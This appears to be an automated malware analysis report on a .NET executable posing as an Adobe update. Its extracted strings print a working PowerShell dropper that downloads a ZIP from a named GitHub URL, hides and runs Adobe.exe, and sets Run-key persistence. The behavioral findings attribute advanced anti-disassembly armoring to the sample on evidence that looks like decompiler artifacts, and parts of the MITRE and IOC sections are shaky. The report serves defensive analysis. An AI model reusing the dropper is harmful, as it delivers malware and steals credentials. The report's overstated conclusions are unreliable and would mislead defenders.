# Threat Analysis Report

**Generated:** 2026-06-28 21:18 UTC
**Sample:** `0310e1ecf1def336d641b847ed973ab8a18928331ebdda452667b2d5dcc77c97_0310e1ecf1def336d641b847ed973ab8a18928331ebdda452667b2d5dcc77c97.exe`

---

## File Metadata

| Field | Value |
|-------|-------|
| File name | `0310e1ecf1def336d641b847ed973ab8a18928331ebdda452667b2d5dcc77c97_0310e1ecf1def336d641b847ed973ab8a18928331ebdda452667b2d5dcc77c97.exe` |
| File type | PE32 executable for MS Windows 4.00 (GUI), Intel i386 Mono/.Net assembly, 3 sections |
| Size | 102,912 bytes |
| MD5 | `cdd4ce5fee20a73e69c4d14db5ee1066` |
| SHA1 | `4b14ce81984163e31cc05776fac41d95b49a0e70` |
| SHA256 | `0310e1ecf1def336d641b847ed973ab8a18928331ebdda452667b2d5dcc77c97` |
| Overall entropy | 4.216 |
| Unpacked | No |

## PE Analysis

| Field | Value |
|-------|-------|
| Timestamp | 1778088930 |
| Machine | 332 |
| Packed | No |

### Sections

| Name | Size | Entropy | Packed |
|------|------|---------|--------|
| `.text` | 32,768 | 5.93 | No |
| `.rsrc` | 69,120 | 2.496 | No |
| `.reloc` | 512 | 0.078 | No |

### Imports

**mscoree.dll**: `_CorExeMain`

## Extracted Strings

Total strings found: **577** (showing first 100)

```
!This program cannot be run in DOS mode.
$
`.rsrc
@.reloc

,	rG
$ErrorActionPreference = "Continue"

# Runtime randomization - adds variation to each execution
$randDelay = Get-Random -Minimum 500 -Maximum 3000
Start-Sleep -Milliseconds $randDelay

$url = "https://github.com/ayomide940-prog/o365Loads/releases/download/1/Adobe.zip"
$randSuffix = [guid]::NewGuid().ToString().Substring(0,8)
$zipFile = "C:\Temp\Updater_$randSuffix.zip"
$extractDir = "C:\Temp\HolographicDisplay_$(Get-Random -Minimum 1000 -Maximum 9999)"
$exePath = "$extractDir\Adobe.exe"

# Create temp folder
New-Item -ItemType Directory -Path "C:\Temp" -Force | Out-Null
if (Test-Path $extractDir) { Remove-Item $extractDir -Recurse -Force }
New-Item -ItemType Directory -Path $extractDir -Force | Out-Null

# Download ZIP with random retry logic
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$wc = New-Object Net.WebClient
Write-Host "Downloading from: $url"
$maxRetry = Get-Random -Minimum 1 -Maximum 3
$attempt = 0
while ($attempt -lt $maxRetry) {
    try {
        $wc.DownloadFile($url, $zipFile)
        break
    } catch {
        $attempt++
        if ($attempt -lt $maxRetry) {
            Start-Sleep -Milliseconds (Get-Random -Minimum 1000 -Maximum 3000)
        }
    }
}
Write-Host "Download complete. File size: $(if(Test-Path $zipFile) { (Get-Item $zipFile).Length })"

# Hide and protect ZIP
attrib +h +r $zipFile

# Random delay before extraction
Start-Sleep -Milliseconds (Get-Random -Minimum 300 -Maximum 1500)

# Extract
Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force

# List what's actually in the folder
Write-Host "Files HolographicDisplay:"
Get-ChildItem $extractDir -Recurse | Select-Object Name

# Protect HolographicDisplay folder
attrib +h +r $extractDir /s /d

# Random delay before execution
Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)

# Execute payload silently
if (Test-Path $exePath) {
    & $exePath
    Start-Sleep -Seconds (Get-Random -Minimum 3 -Maximum 8)
}

# Add persistence with random registry variation
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "SystemMaint_$(Get-Random -Minimum 100 -Maximum 999)"
$regValue = $exePath
New-Item -Path $regPath -Force | Out-Null
New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null

v4.0.30319
#Strings
<Module>
Adobe.exe
Credential_Form
ModuleNameSpace
CREDUI_INFO
CREDUI_FLAGS
CredUI_ReturnCodes
User_Pwd
MainModuleRawUI
Input_Box
Choice_Box
ReadKey_Box
Keyboard_Form
Progress_Form
Progress_Data
MainModuleUI
MainModule
ConsoleColorProxy
MainAppInterface
MainApp
mscorlib
System
Object
ValueType
System.Management.Automation
System.Management.Automation.Host
PSHostRawUserInterface
System.Windows.Forms
PSHostUserInterface
PSHost
System.Text
StringBuilder
CredUIPromptForCredentials
PSCredentialTypes
PSCredentialUIOptions
PromptForPassword
cbSize
hwndParent
pszMessageText
pszCaptionText
hbmBanner
value__
INCORRECT_PASSWORD
DO_NOT_PERSIST
REQUEST_ADMINISTRATOR
EXCLUDE_CERTIFICATES
REQUIRE_CERTIFICATE
SHOW_SAVE_CHECK_BOX
ALWAYS_SHOW_UI
REQUIRE_SMARTCARD
PASSWORD_ONLY_OK
VALIDATE_USERNAME
COMPLETE_USERNAME
PERSIST
SERVER_CREDENTIAL
EXPECT_CONFIRMATION
GENERIC_CREDENTIALS
USERNAME_TARGET_CREDENTIALS
KEEP_USERNAME
NO_ERROR
ERROR_CANCELLED
ERROR_NO_SUCH_LOGON_SESSION
ERROR_NOT_FOUND
ERROR_INVALID_ACCOUNT_NAME
ERROR_INSUFFICIENT_BUFFER
ERROR_INVALID_PARAMETER
ERROR_INVALID_FLAGS
Password
Domain
ConsoleColor
GUIBackgroundColor
GUIForegroundColor
GUITitle
get_BackgroundColor
set_BackgroundColor
get_BufferSize
set_BufferSize
Coordinates
get_CursorPosition
set_CursorPosition
get_CursorSize
set_CursorSize
Invisible_Form
FlushInputBuffer
get_ForegroundColor
set_ForegroundColor
BufferCell
Rectangle
GetBufferContents
get_KeyAvailable
get_MaxPhysicalWindowSize
get_MaxWindowSize
KeyInfo
```

## Disassembly Overview

Functions analyzed: **30** | Decompiled to C: **28**

| Name | Offset | Size | Decompiled |
|------|--------|------|------------|
| `method.ModuleNameSpace.MainApp.CurrentDomain_UnhandledException` | `0x404aac` | 35688 | — |
| `method.ModuleNameSpace.MainApp..ctor` | `0x404ac7` | 35660 | — |
| `method.ModuleNameSpace.Progress_Form.Update` | `0x403314` | 2120 | ✓ |
| `method.__c__DisplayClass6._Main_b__2` | `0x40443b` | 1676 | ✓ |
| `entry0` | `0x404454` | 1624 | ✓ |
| `method.ModuleNameSpace.MainModuleUI.Prompt` | `0x403ba8` | 928 | ✓ |
| `method.ModuleNameSpace.Choice_Box.Show` | `0x4025c4` | 816 | ✓ |
| `method.ModuleNameSpace.Progress_Form.AddBar` | `0x403078` | 655 | ✓ |
| `sym.ModuleNameSpace.Input_Box.Show` | `0x40235c` | 596 | ✓ |
| `method.Keyboard_Form.Keyboard_Form_KeyDown` | `0x402ac4` | 316 | ✓ |
| `method.Keyboard_Form.Keyboard_Form_KeyUp` | `0x402c00` | 316 | ✓ |
| `method.ModuleNameSpace.ReadKey_Box.Show` | `0x402958` | 264 | ✓ |
| `method.ModuleNameSpace.Progress_Form.DrawingColor` | `0x402d3c` | 232 | ✓ |
| `method.ModuleNameSpace.Credential_Form.PromptForPassword` | `0x402050` | 218 | ✓ |
| `method.ModuleNameSpace.Progress_Form.InitializeComponent` | `0x402f2c` | 208 | ✓ |
| `method.ModuleNameSpace.MainModuleRawUI.GetBufferContents` | `0x4021fc` | 139 | ✓ |
| `method.ModuleNameSpace.Progress_Form.TimeTick` | `0x402ffc` | 124 | ✓ |
| `method.ModuleNameSpace.MainModuleUI.getPassword` | `0x404064` | 124 | ✓ |
| `method.ModuleNameSpace.MainModuleUI.WriteProgress` | `0x40414c` | 111 | ✓ |
| `method.ModuleNameSpace.Progress_Form..ctor` | `0x402ecc` | 96 | ✓ |
| `sym.ModuleNameSpace.MainModuleUI.PromptForCredential` | `0x403f68` | 96 | ✓ |
| `method.ModuleNameSpace.MainModuleRawUI.FlushInputBuffer` | `0x40218c` | 95 | ✓ |
| `method.ModuleNameSpace.MainModuleUI.ReadLineAsSecureString` | `0x4040e0` | 93 | ✓ |
| `method.ModuleNameSpace.ReadKey_Box.GetCharFromKeys` | `0x4028fc` | 92 | ✓ |
| `method.Keyboard_Form..ctor` | `0x402a68` | 92 | ✓ |
| `method.ModuleNameSpace.MainModuleUI.PromptForCredential` | `0x403fc8` | 91 | ✓ |
| `sym.ModuleNameSpace.Progress_Form..ctor_1` | `0x402e74` | 88 | ✓ |
| `sym.ModuleNameSpace.Progress_Form..ctor` | `0x402e24` | 80 | ✓ |
| `method.ModuleNameSpace.MainModuleUI..ctor` | `0x403b5c` | 76 | ✓ |
| `method.ModuleNameSpace.MainModule..ctor` | `0x4041c0` | 76 | ✓ |

### Decompiled Code Files

- [`code/entry0.c`](code/entry0.c)
- [`code/method.Keyboard_Form..ctor.c`](code/method.Keyboard_Form..ctor.c)
- [`code/method.Keyboard_Form.Keyboard_Form_KeyDown.c`](code/method.Keyboard_Form.Keyboard_Form_KeyDown.c)
- [`code/method.Keyboard_Form.Keyboard_Form_KeyUp.c`](code/method.Keyboard_Form.Keyboard_Form_KeyUp.c)
- [`code/method.ModuleNameSpace.Choice_Box.Show.c`](code/method.ModuleNameSpace.Choice_Box.Show.c)
- [`code/method.ModuleNameSpace.Credential_Form.PromptForPassword.c`](code/method.ModuleNameSpace.Credential_Form.PromptForPassword.c)
- [`code/method.ModuleNameSpace.MainModule..ctor.c`](code/method.ModuleNameSpace.MainModule..ctor.c)
- [`code/method.ModuleNameSpace.MainModuleRawUI.FlushInputBuffer.c`](code/method.ModuleNameSpace.MainModuleRawUI.FlushInputBuffer.c)
- [`code/method.ModuleNameSpace.MainModuleRawUI.GetBufferContents.c`](code/method.ModuleNameSpace.MainModuleRawUI.GetBufferContents.c)
- [`code/method.ModuleNameSpace.MainModuleUI..ctor.c`](code/method.ModuleNameSpace.MainModuleUI..ctor.c)
- [`code/method.ModuleNameSpace.MainModuleUI.Prompt.c`](code/method.ModuleNameSpace.MainModuleUI.Prompt.c)
- [`code/method.ModuleNameSpace.MainModuleUI.PromptForCredential.c`](code/method.ModuleNameSpace.MainModuleUI.PromptForCredential.c)
- [`code/method.ModuleNameSpace.MainModuleUI.ReadLineAsSecureString.c`](code/method.ModuleNameSpace.MainModuleUI.ReadLineAsSecureString.c)
- [`code/method.ModuleNameSpace.MainModuleUI.WriteProgress.c`](code/method.ModuleNameSpace.MainModuleUI.WriteProgress.c)
- [`code/method.ModuleNameSpace.MainModuleUI.getPassword.c`](code/method.ModuleNameSpace.MainModuleUI.getPassword.c)
- [`code/method.ModuleNameSpace.Progress_Form..ctor.c`](code/method.ModuleNameSpace.Progress_Form..ctor.c)
- [`code/method.ModuleNameSpace.Progress_Form.AddBar.c`](code/method.ModuleNameSpace.Progress_Form.AddBar.c)
- [`code/method.ModuleNameSpace.Progress_Form.DrawingColor.c`](code/method.ModuleNameSpace.Progress_Form.DrawingColor.c)
- [`code/method.ModuleNameSpace.Progress_Form.InitializeComponent.c`](code/method.ModuleNameSpace.Progress_Form.InitializeComponent.c)
- [`code/method.ModuleNameSpace.Progress_Form.TimeTick.c`](code/method.ModuleNameSpace.Progress_Form.TimeTick.c)
- [`code/method.ModuleNameSpace.Progress_Form.Update.c`](code/method.ModuleNameSpace.Progress_Form.Update.c)
- [`code/method.ModuleNameSpace.ReadKey_Box.GetCharFromKeys.c`](code/method.ModuleNameSpace.ReadKey_Box.GetCharFromKeys.c)
- [`code/method.ModuleNameSpace.ReadKey_Box.Show.c`](code/method.ModuleNameSpace.ReadKey_Box.Show.c)
- [`code/method.__c__DisplayClass6._Main_b__2.c`](code/method.__c__DisplayClass6._Main_b__2.c)
- [`code/sym.ModuleNameSpace.Input_Box.Show.c`](code/sym.ModuleNameSpace.Input_Box.Show.c)
- [`code/sym.ModuleNameSpace.MainModuleUI.PromptForCredential.c`](code/sym.ModuleNameSpace.MainModuleUI.PromptForCredential.c)
- [`code/sym.ModuleNameSpace.Progress_Form..ctor.c`](code/sym.ModuleNameSpace.Progress_Form..ctor.c)
- [`code/sym.ModuleNameSpace.Progress_Form..ctor_1.c`](code/sym.ModuleNameSpace.Progress_Form..ctor_1.c)

## Behavioral Analysis

This concludes the analysis of the provided disassembly chunks (10/10). The final segment confirms that the malware is not merely obfuscated, but specifically engineered to sabotage the tools used by security researchers.

### Final Technical Analysis: Update Chunk 10 (Disassembler Sabotage & Intentional Logic Corruption)

This final chunk focuses on the `MainModule..ctor` (the primary constructor for the main module). In standard software, this is a routine initialization step; here, it serves as a final layer of "technical warfare" against automated analysis.

#### 1. Intentional Disassembler Sabotage
The disassembly contains explicit warnings:
*   **"Control flow encountered bad instruction data"**
*   **"Instruction at (ram,0x004044a6) overlaps instruction at (ram,0x004044a4)"**

**Analysis:** These are not errors in the disassembly tool; they are artifacts of a technique called **Instruction Overlapping**. By jumping into the *middle* of an existing instruction or using multi-byte opcodes that look like different instructions depending on where the "jump" starts, the author ensures that tools like Ghidra and IDA Pro cannot generate a reliable flow graph. This forces the analyst to manually examine the raw hex bytes to find the true execution path, exponentially increasing the time required for analysis.

#### 2. Decompiler Exhaustion via Complex Arithmetic
The code is saturated with `CONCAT`, `SCARRY`, and `CARRY` operations involving complex bit-shifting (e.g., `puVar13 = CONCAT31(Var16,cVar7)`).
*   **The Technique:** The malware performs a massive amount of "junk" math to calculate memory addresses or register values that ultimately result in standard constants. 
*   **Impact on Analysis:** This is designed to exhaust the human analyst and the automated decompiler. When the compiler cannot simplify these expressions, it produces a mess of variables (`puVar13`, `pcVar8`, etc.) instead of meaningful code. It creates a "wall" of math that hides simple logic like "move string to memory" or "open network socket."

#### 3. Opaque Predicates & Dummy Branches
The recurring use of `POPCOUNT` and other mathematical checks (e.g., `if ((POPCOUNT(uVar4) & 1U) == 0)`) are used to create **Opaque Predicates**.
*   **The Technique:** These conditions are mathematically guaranteed to be true or false, but the *tool* cannot prove it easily. 
*   **Impact on Analysis:** The tool sees two possible branches for every check. An analyst looking at this code must manually evaluate hundreds of these "choices," even though only one path is ever taken by the CPU. This creates a massive tree of possibilities that makes automated logic mapping nearly impossible.

#### 4. Low-Level Execution Hooks
The presence of `swi(1)` (Software Interrupt) and references to system registers (`in_ES`, `in_SS`) suggests the malware interacts with low-level system calls or exception handlers.
*   **Significance:** This may be used for custom exception handling, allowing the malware to "recover" if an analyst tries to break into it with a debugger, or to execute code directly from non-standard memory regions to evade common detection hooks.

---

### Final Summary of Findings (Complete Analysis)

#### **Core Functionality & Purpose**
The malware is a **Highly Sophisticated Trojan/Credential Stealer**. It uses an "Adobe Update" guise to deceive the user, while its internal structure is built to systematically defeat automated and manual analysis techniques common in professional cyber-defense.

#### **Key Behaviors Identified**
*   **Advanced Defense Evasion:** Employs instruction overlapping and "bad" jumps specifically designed to break the logic flow of disassembly tools (Ghidra/IDA).
*   **Decompiler Exhaustion:** Uses dense, manual-labor-heavy math for even basic tasks (like initializing UI elements) to hide its true intent behind a wall of complexity.
*   **Opaque Predicates:** Utilizes `POPCOUNT` and complex arithmetic to create thousands of "fake" branches, making it mathematically difficult for automated tools to map the code’s behavior.
*   **Time-Gate Strategy:** By inflating the complexity of trivial components like `Progress_Form`, it ensures that a manual analysis would take days or weeks—often longer than the time needed for the malware to complete its theft and move on.

#### **Risk Assessment**
**Critical.** The level of sophistication indicates a high-resource, professional threat actor. This is not "commodity" malware; it is a bespoke tool designed to stay active in the wild by making the cost of analysis too high for standard security teams.

---

### Final Technical Summary Table (Consolidated)

| Category | Technique | Purpose |
| :--- | :--- | :--- |
| **Primary Goal** | **Credential Theft** | Steal user login data under a fake "Adobe" update interface. |
| **Infection Vector** | **Social Engineering** | Uses the `Progress_Form` to trick users into believing an official update is occurring. |
| **Analysis Obstruction** | **Instruction Overlap** | Deliberately misaligns code to break the graph-building capabilities of Ghidra/IDA Pro. |
| **Analysis Obstruction** | **Opaque Predicates** | Uses `POPCOUNT` math to create "fake" branches, forcing humans to manually verify every line. |
| **Persistence/Delivery** | **PowerShell Script** | Initial stage used for environment setup and downloading the primary payload (`Adobe.exe`). |
| **Decoding Strategy** | **Decompiler Exhaustion** | Uses dense bitwise and arithmetic "noise" to hide simple logic (e.g., hidden C2 URLs). |
| **Execution Control** | **Time-Gate Tactics** | Ensures that even if a sample is captured, the complexity of its code delays the creation of IOCs/signatures. |
| **Complexity Level** | **High Sophistication** | Indicates a professional threat actor targeting high-value data (credentials). |

---
**Conclusion:** This malware is "armored" against both machine and human scrutiny. It doesn't just hide its actions; it actively sabotages the tools used to uncover those actions. Security teams should treat any instance of this code as an active, high-priority intrusion.

---

## MITRE ATT&CK Mapping

As a threat intelligence analyst, I have mapped the behaviors observed in the provided technical analysis to the relevant MITRE ATT&CK techniques and sub-techniques.

| Technique ID | Name | Justification |
| :--- | :--- | :--- |
| **T1027** | Obfuscated Files or Information | Instruction overlapping, opaque predicates (POPCOUNT), and complex "junk" arithmetic are used to hinder automated analysis tools like Ghidra and IDA Pro. |
| **T1566** | Phishing | The use of a fake "Adobe Update" interface constitutes a social engineering tactic to deceive users into executing the malicious payload. |
| **T1059.001** | Command and Scripting Interpreter: PowerShell | A PowerShell script is utilized for initial execution, environment setup, and the delivery of the primary `Adobe.exe` payload. |
| **T1539** | Steal Web Credentials | The analysis identifies the malware's ultimate goal as a credential stealer aimed at harvesting user login information. |
| **T1027** (Defense Evasion) | Obfuscation (General) | The "Time-Gate Strategy" and high-complexity logic are designed to delay the identification of IOCs, effectively evading detection over time. |
| **T1068** | Exploitation for Privilege Escalation / System Access | While not explicitly stated as a privilege escalation, the use of low-level system interrupts (`swi(1)`) and register access suggests attempts to bypass standard security hooks or interact with the kernel directly. |

### Analyst Notes:
*   **Complexity Analysis:** The heavy reliance on **T1027** indicates a high level of sophistication intended for "Anti-Analysis" purposes, targeting not just human analysts but also automated disassembly and decompiler pipelines.
*   **Social Engineering Context:** The use of the **T1566** phishing tactic combined with specialized obfuscation confirms this is a professional-grade threat actor rather than a simple automated worm.
*   **Operational Impact:** The "Time-Gate" strategy specifically targets the window between infection and detection, aiming to ensure the malware completes its primary objective (credential theft) before security teams can respond.

---

## Indicators of Compromise

Based on the provided strings and behavioral analysis, here are the extracted Indicators of Compromise (IOCs):

**IP addresses / URLs / Domains**
*   `https://github.com/ayomide940-prog/o365Loads/releases/download/1/Adobe.zip` (Malware distribution point)

**File paths / Registry keys**
*   `C:\Temp\Updater_*.zip` (Temporary directory for the initial payload download; uses a random suffix)
*   `C:\Temp\HolographicDisplay_*` (Directory used to mask the execution of `Adobe.exe`)
*   `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run` (Registry key utilized for persistence)
*   `SystemMaint_*.exe` (Registry value name; uses a random numeric suffix to disguise as a system maintenance task)

**Mutex names / Named pipes**
*   *None identified.*

**Hashes**
*   *None identified in the provided text.*

**Other artifacts**
*   `Adobe.exe` (Naming convention used for the malicious executable)
*   `HolographicDisplay` (Sub-folder name used to mask activities/files)
*   `SystemMaint` (String prefix used for persistence masquerading)
*   **Behavioral Pattern:** Use of `Net.WebClient` with `Tls12` protocol for payload retrieval.
*   **Behavioral Pattern:** Implementation of **Instruction Overlapping** and **Opaque Predicates** (via `POPCOUNT`) to evade automated disassembly tools like Ghidra/IDA Pro.

---

## Malware Family Classification

1. **Malware family**: custom
2. **Malware type**: infostealer
3. **Confidence**: High

4. **Key evidence**:
*   **Advanced Anti-Analysis Techniques:** The sample utilizes advanced techniques like instruction overlapping, opaque predicates (POPCOUNT), and decompiler exhaustion to deliberately sabotage analysis tools like Ghidra and IDA Pro.
*   **Social Engineering & Credential Theft:** The malware employs a fake "Adobe Update" interface to deceive users while its primary functional goal is identified as harvesting user login credentials.
*   **Sophisticated Infrastructure:** The use of multi-stage delivery (PowerShell downloader), custom naming conventions (e.g., `HolographicDisplay`), and deliberate "Time-Gate" tactics indicates a professional, bespoke threat actor rather than commodity malware.
